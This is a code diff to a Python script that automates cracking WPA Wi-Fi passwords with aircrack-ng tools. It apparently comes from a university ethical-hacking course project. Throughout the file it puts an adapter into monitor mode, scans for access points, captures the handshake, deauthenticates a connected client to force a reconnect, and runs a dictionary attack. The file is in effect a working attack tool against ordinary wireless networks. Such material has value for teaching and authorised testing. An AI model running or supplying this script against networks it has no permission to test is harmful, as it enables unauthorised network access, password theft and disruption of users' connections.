@@ -9,11 +9,11 @@ import time
 
 ###############################################################
 # Specify directory to store temporary intercepted packets
-# Default: Creates folder in current directory
+# Default: Creates directory "./packets"
 packetPath = ""
 
 # Specify path to custom dictionary for cracking
-# Default: Uses included dictionary 
+# Default: Uses included dictionary
 dictionaryPath = ""
 
 # Specify file to store passwords in
@@ -27,10 +27,12 @@ interfaceName = ""
 
 # Specify access point MAC address (BSSID) to target
 # Default: Present user with detected access points to choose from
+# routerBSSID = "10:BF:48:D3:93:B8" # CS378-EthicalHacking-GDC-2.212
 routerBSSID = ""
 
 # Specify channel to scan on
 # Default: Prompt user to choose channel or scan all channels
+# channel = "6"
 channel = ""
 ###############################################################
 
@@ -41,7 +43,8 @@ def main():
 	try:
 		environmentSetup()
 		killInterference()
-		getTargetAccessPoint()
+		while routerBSSID == "" or channel == "":
+			getTargetAccessPoint()
 		captureHandshake()
 		crackHandshake()
 	finally:
@@ -53,8 +56,14 @@ def is_valid_path(parser, arg):
         parser.error("The path %s does not exist!" % arg)
 
 
-def bash_command(cmd, timeout=None):
-	return subprocess.Popen(['/bin/bash', '-c', cmd], stdout=subprocess.PIPE)
+def bash_command(cmd, debug=False):
+	if debug:
+		process = subprocess.Popen(['/bin/bash', '-c', cmd])
+	else:
+		process = subprocess.Popen(['/bin/bash', '-c', cmd],
+				stdout=subprocess.PIPE,
+				stderr=subprocess.PIPE)
+	return process
 
 
 class readable_dir(argparse.Action):
@@ -95,9 +104,11 @@ def environmentSetup():
 	user did NOT specify that particular attribute either global (in this file)
 	or via the commandline. '''
 	# use default path for packets	
-	if not packetPath and not os.path.exists(os.getcwd() + "/packets"):
-		os.makedirs(os.getcwd() + "/packets")
-		packetPath = os.getcwd() + "/packets"
+	if not packetPath:
+		# create packets directory if it doesn't exist
+		if not os.path.exists(os.getcwd() + "/packets"):
+			os.makedirs(os.getcwd() + "/packets")
+		packetPath = os.getcwd() + "/packets/"
 	# use included dictionary
 	if not dictionaryPath and os.path.isfile(os.getcwd() + "/dictionary.txt"):
 		dictionaryPath = os.getcwd() + "/dictionary.txt"
@@ -152,29 +163,48 @@ def setGlobalAttribute(arg):
 
 def getTargetAccessPoint():
 	''' airdump setup '''
-	global interfaceName, channel
+	global interfaceName
+	global channel
+	global routerBSSID
 
 	while True:
-		channel = input("Channel number to listen to (0 to scan multiple): ")
-		scanTime = input("Time limit to listen: ")
-		scanAccessPoints(interfaceName, channel, scanTime)
+		while channel == '':
+			user_input = input("Channel number to listen to (0 to scan multiple): ")
+			if user_input.isdigit() and 0 <= int(user_input) <= 14:
+				channel = int(user_input)
+		scanAccessPoints(interfaceName, channel)
 		result = input("Start new scan? (y=yes): ")
 		if result == 'y' or result == 'yes' or result == '1':
 			continue
 		else:
 			break
-		# TODO: Add repeat option?
+
+	# Get MAC address of the target access point (router)
+	routerBSSID = input("Please select access point MAC address (BSSID 1): ")
 
 
-def scanAccessPoints(interfaceName, channel, scanTime):
-	print("Using interface: " + interfaceName)
+def scanAccessPoints(interfaceName, channel):
 	# Allow user to select an AP (access point) by MAC address
-	print("Listing routers close to user's location...")
-	# TODO: What if it's listed as wlan0 but changes to wlan0mon?
+	print("Listing access points close to user's location...")
+
+	# Specify how long to run scan
+	scanTime = ''
+	while not scanTime.isdigit():
+		user_input = input("Time limit to listen: ")
+		scanTime = user_input
+
+	# if channel is specified, limit scan to given channel
 	if int(channel) > 0:
-		airodump = bash_command("airodump-ng -c " + str(channel) + " " + str(interfaceName) + " -w dump --output-format csv")
+		airodump = bash_command("airodump-ng" +
+				" -c " + str(channel) +
+				" --output-format csv" +
+				" -w " + packetPath + "dump" +
+				" " + interfaceName)
 	else:
-		airodump = bash_command("airodump-ng " + str(interfaceName) + " -w dump --output-format csv")
+		airodump = bash_command("airodump-ng" +
+				" --output-format csv" +
+				" -w " + packetPath + "dump" +
+				" " + interfaceName)
 	time.sleep(int(scanTime))
 	airodump.terminate()
 	print("Scan complete.")
@@ -206,7 +236,7 @@ def getInterfaceName():
 			i+=1
 
 	# count how many devices support monitor mode
-	compatibleDevices = [phy for phy in modes.keys() if any("monitor" in s for s in modes[phy])]
+	compatibleDevices = sorted([phy for phy in modes.keys() if any("monitor" in s for s in modes[phy])])
 
 	# check if there are 1 or fewer compatible devices
 	chosenDevice = None
@@ -220,10 +250,10 @@ def getInterfaceName():
 	# ask the user to choose a wireless interface
 	while chosenDevice == None:
 		for i, phy in enumerate(compatibleDevices):
-			print("\t["+str(i)+"] " + phy + " : " + phyToInterface[phy])
+			print("\t[{}] {:5} : {}".format(str(i), phy, phyToInterface[phy]))
 
 		choice = input(str(len(compatibleDevices)) + " compatible wireless devices found. Please choose: ")
-		if choice.isdigit() and (int(choice) >= 0) and (int(choice) < len(compatibleDevices)):
+		if choice.isdigit() and (0 <= int(choice) < len(compatibleDevices)):
 			chosenDevice = compatibleDevices[int(choice)]
 		else:
 			print(choice + " is an invalid option, please try again.\n")
@@ -232,7 +262,7 @@ def getInterfaceName():
 	print("Enabling monitor mode on " + phyToInterface[chosenDevice] + "...")
 	process = bash_command("airmon-ng start " + phyToInterface[chosenDevice])
 	# wait for airmon-ng to complete
-	process.wait()
+	process.communicate(timeout=10)
 
 	# update interface names for devices
 	output = bash_command("iw dev").stdout.read().decode('utf-8').splitlines()
@@ -249,34 +279,39 @@ def getInterfaceName():
 
 def captureHandshake():
 	global routerBSSID
-	# Get MAC address of the target access point (router)
-	routerBSSID = input("Please select router MAC address (BSSID 1): ")
-	# TODO: Parse input - insert colon delimiters, make all-caps?
-	scanTime = input("Time limit to listen: ")
 
-	clientBSSID = scanClientsForAccessPoint(scanTime)
-	airodump_proc = bash_command("airodump-ng --output-format cap -c " + str(channel) + " --bssid " + str(routerBSSID) + " -w packet " + str(interfaceName))
+	clientBSSID = scanClientsForAccessPoint()
+	airodump_proc = bash_command("airodump-ng" +
+			" -c " + str(channel) +
+			" --bssid " + str(routerBSSID) +
+			" --output-format cap" +
+			" -w " + packetPath + "packet " +
+			str(interfaceName))
 	time.sleep(2)
 	deauthenticateClient(clientBSSID)
 	time.sleep(8)
 	airodump_proc.terminate()
 
 
-def scanClientsForAccessPoint(scanTime, routerESSID=None):
-	global routerBSSID, channel
+def scanClientsForAccessPoint(routerESSID=None):
+	global routerBSSID
+	global channel
+
 	print("Using interface: " + interfaceName)
+
 	# Allow user to select an AP (access point) by MAC address
 	if routerESSID == None or routerESSID == '':
 		print("Scanning clients connected to access point " + routerBSSID + "...")
 	else:
 		print("Scanning clients connected to access point " + routerESSID + "...")
-	# TODO: Change routerBSSID to ESSID in print statement
 
 	# List all clients connected to target AP
-	process = bash_command("airodump-ng -c " + str(channel) + " --bssid " + str(routerBSSID) + " " + str(interfaceName))
+	scanTime = ''
+	while not scanTime.isdigit():
+		scanTime = input("Time limit to listen: ")
+	process = bash_command("airodump-ng -c " + str(channel) + " --bssid " + str(routerBSSID) + " " + str(interfaceName), debug=True)
 	time.sleep(int(scanTime))
 	process.terminate()
-	print("Scan complete.")
 
 	# Have user select client to use
 	# TODO: Automatically select a client to use
@@ -310,21 +345,13 @@ def crackHandshake():
 		process = bash_command("ls")
 		print(process.stdout.read().decode('utf-8'))
 		dictionaryPath = input("Please specify wordlist for dictionary crack: ")
-	print("aircrack-ng -w " + dictionaryPath + " -b " + routerBSSID + "packet-01.cap")
+	print("aircrack-ng -w " + dictionaryPath + " -b " + routerBSSID + " " + packetPath + "packet-01.cap")
 	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + routerBSSID + " packet-01.cap")
 	print(process.stdout.read().decode('utf-8'))
 
 def cleanUp():
-	# TODO: remove dump file
-	if os.path.exists(os.getcwd() + "/packets"):
-		shutil.rmtree(os.getcwd() + "/packets")
-
-	if os.path.isfile(os.getcwd() + "/packet-01.cap"):
-		os.remove(os.getcwd() + "/packet-01.cap")
-
-	if os.path.isfile(os.getcwd() + "/dump-01.csv"):
-		os.remove(os.getcwd() + "/dump-01.csv")
-
+	if os.path.exists(packetPath):
+		shutil.rmtree(packetPath)
 
 if __name__ == "__main__":
 	main()
